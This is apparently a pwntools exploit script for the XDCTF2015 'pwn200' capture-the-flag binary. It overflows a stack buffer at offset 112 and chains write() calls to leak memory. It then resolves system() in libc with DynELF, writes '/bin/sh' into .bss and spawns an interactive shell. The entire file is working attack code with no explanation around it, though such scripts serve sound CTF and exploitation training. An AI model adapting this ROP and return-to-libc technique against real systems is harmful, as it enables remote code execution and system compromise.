from pwn import *

p = process('./pwn200')
elf = ELF('./pwn200')
write = elf.plt['write']
read  = elf.plt['read']
bss = elf.bss(0x2C)
main = 0x80484be
pppt = 0x0804856c
offset = 112

def leak(address):
    p.recvuntil('Welcome to XDCTF2015~!\n')
    payload = "A" * 112 + p32(write) + p32(main) + p32(1) + p32(address) + p32(4)
    p.send(payload)
    data = p.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data
d = DynELF(leak, elf = elf)
systemAddress = d.lookup('system', 'libc')
payload = 'A' * 112 + p32(read) + p32(pppt) + p32(0) + p32(bss) + p32(0x2C) + p32(systemAddress) + p32(main) + p32(bss)
p.send(payload)
payload = "/bin/sh\00"
p.send(payload)
p.interactive()
